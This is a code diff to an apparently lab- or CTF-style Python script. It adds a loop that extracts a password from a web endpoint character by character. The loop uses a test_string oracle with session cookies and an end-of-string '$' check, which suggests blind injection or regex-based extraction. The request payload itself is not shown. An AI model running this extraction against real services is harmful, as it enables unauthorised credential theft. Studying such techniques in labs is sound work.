@@ -69,6 +69,21 @@ if __name__ == "__main__":
             num = num + 1
         else:
             break
-
     print(f"Password length is {num}")
+    print(f"Time elapsed is {time.perf_counter()-begin_time}")
+    
+    # Step 8: Linear Search:
+    begin_time = time.perf_counter()
+    while True:
+        # Test if the current prefix IS the exact password.
+        if test_string(url, prefix, '$', mycookies):
+            break
+        # Otherwise, go through the letter list
+        for letter in start_alpha:
+            check = test_string(url, prefix, letter, mycookies)
+            if check:
+                prefix += letter
+                break
+
+    print(f"Password is {prefix}")
     print(f"Time elapsed is {time.perf_counter()-begin_time}")
